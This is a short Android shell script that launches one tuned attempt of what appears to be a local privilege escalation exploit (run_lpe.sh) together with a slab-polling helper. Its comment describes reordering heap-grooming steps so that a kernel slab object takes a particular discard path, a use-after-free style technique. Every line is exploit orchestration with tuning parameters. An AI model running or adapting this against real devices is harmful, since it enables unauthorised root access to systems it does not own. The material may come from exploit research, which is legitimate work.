#!/system/bin/sh
# run6: reordered attempt -- sparse pushes before the flush delete, so X's
# slab reaches the node partial list while still partial and the last free
# takes the immediate discard path.
cd /data/local/tmp || exit 1
rm -f ic-run6.log ic-slabpoll6.log
nohup sh /data/local/tmp/poll6.sh > /data/local/tmp/ic-slabpoll6.log 2>&1 &
IC_PAD_SKIP=15 IC_PAD_KEEP=31 IC_FLUSH_DEL=16 IC_FLUSH_SPARSE=15 \
  ATTEMPTS=1 nohup sh /data/local/tmp/run_lpe.sh > /data/local/tmp/ic-run6.log 2>&1 &
exit 0
